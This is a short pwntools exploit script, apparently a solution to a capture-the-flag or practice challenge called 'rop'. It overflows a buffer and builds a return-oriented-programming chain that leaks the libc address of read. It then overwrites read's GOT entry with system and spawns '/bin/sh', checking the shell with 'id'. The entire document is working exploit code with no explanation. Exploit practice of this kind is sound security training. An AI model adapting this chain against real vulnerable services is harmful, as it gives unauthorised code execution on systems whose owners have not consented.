from pwn import *
from time import *

p = process("./rop")
e = ELF("./rop")
rop = ROP(e)

read_plt,read_got,write_plt = e.plt['read'],e.got['read'],e.plt['write']
offset = 0x9d0b0
dynamic = 0x08049530
pppr_gadget = 0x080484b6
binsh = "/bin/sh"
lenbinsh = len(binsh)

payload = "a"*140

rop.read(0,e.bss(),lenbinsh)
rop.write(1,read_got,4)
rop.read(0,read_got,4)
rop.read(e.bss())

payload += rop.chain()

p.send(payload)
p.send(binsh)
sleep(1)
read = u32(p.recv(4))
print hex(read)

system = read-offset
print hex(system)

p.send(p32(system))
p.send("id\n")
sleep(1)
print p.recv()
